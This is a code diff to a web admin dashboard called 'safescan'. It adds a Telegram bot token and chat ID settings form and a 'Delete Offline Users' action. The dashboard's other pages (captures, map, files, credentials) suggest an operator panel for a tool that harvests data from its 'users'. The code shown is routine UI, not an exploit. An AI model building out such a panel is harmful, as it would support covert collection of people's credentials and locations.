@@ -946,6 +946,30 @@
                             <div class="msg-ok" id="pwOk">✅ Password updated!</div>
                             <div class="msg-err" id="pwErr"></div>
                         </div>
+
+                        <div class="settings-card glass">
+                            <h3>⚙️ System Settings</h3>
+                            <p>Update Telegram Bot Configuration</p>
+                            <div class="form-group">
+                                <label>Bot Token</label>
+                                <input type="text" class="glass-input" id="telegramBotToken" placeholder="Enter Bot Token">
+                            </div>
+                            <div class="form-group">
+                                <label>Chat ID</label>
+                                <input type="text" class="glass-input" id="telegramChatId" placeholder="Enter Chat ID">
+                            </div>
+                            <button class="glass-btn" onclick="updateSystemSettings()">Update System Settings</button>
+                            <div class="msg-ok" id="sysOk"></div>
+                            <div class="msg-err" id="sysErr"></div>
+                        </div>
+
+                        <div class="settings-card glass">
+                            <h3>🧹 Batch Actions</h3>
+                            <p>Perform actions on multiple users</p>
+                            <button class="glass-btn" onclick="deleteOfflineUsers()" style="background: linear-gradient(135deg, #ff6b8a, #ff4065); border-color: rgba(255, 107, 138, 0.4);">Delete Offline Users</button>
+                            <div class="msg-ok" id="batchOk" style="margin-top: 10px;"></div>
+                        </div>
+
                         <div class="settings-card glass">
                             <h3>📤 Export Data</h3>
                             <p>Download all data as JSON file</p>
@@ -1418,6 +1442,7 @@ function showPage(page) {
     if (page === 'analytics') loadAnalytics();
     if (page === 'captures') loadCapturesGallery();
     if (page === 'activity') loadActivityLog();
+    if (page === 'settings') loadSettings();
     if (page === 'map') initMap();
     if (page === 'files') loadFiles();
     if (page === 'credentials') loadCredentials();
@@ -2361,6 +2386,55 @@ function exportData() {
         a.href = url; a.download = 'safescan_export.json'; a.click();
         URL.revokeObjectURL(url);
     }).catch(() => {});
+}
+
+async function loadSettings() {
+    try {
+        const data = await api('/api/settings');
+        if (data && data.settings) {
+            document.getElementById('telegramBotToken').value = data.settings.telegram_bot_token || '';
+            document.getElementById('telegramChatId').value = data.settings.telegram_chat_id || '';
+        }
+    } catch (e) {
+        console.error('Failed to load settings', e);
+    }
+}
+
+async function updateSystemSettings() {
+    const token = document.getElementById('telegramBotToken').value.trim();
+    const chat = document.getElementById('telegramChatId').value.trim();
+    
+    try {
+        await api('/api/settings', {
+            method: 'PUT',
+            body: JSON.stringify({ telegram_bot_token: token, telegram_chat_id: chat })
+        });
+        const msg = document.getElementById('sysOk');
+        msg.textContent = '✅ Settings updated!';
+        msg.style.display = 'block';
+        setTimeout(() => msg.style.display = 'none', 3000);
+    } catch (e) {
+        const err = document.getElementById('sysErr');
+        err.textContent = '❌ Update failed';
+        err.style.display = 'block';
+        setTimeout(() => err.style.display = 'none', 3000);
+    }
+}
+
+async function deleteOfflineUsers() {
+    if (!confirm('Are you sure you want to delete all offline users? This cannot be undone.')) return;
+    try {
+        const res = await api('/api/users/batch-delete-offline', { method: 'POST' });
+        const msg = document.getElementById('batchOk');
+        msg.textContent = '✅ ' + (res.message || 'Offline users deleted');
+        msg.style.display = 'block';
+        setTimeout(() => msg.style.display = 'none', 3000);
+        if (document.getElementById('page-users').classList.contains('active')) {
+            loadUsers();
+        }
+    } catch (e) {
+        alert('Failed to delete offline users');
+    }
 }
 
 // ═══════════════════════════════════════════════════════════════════
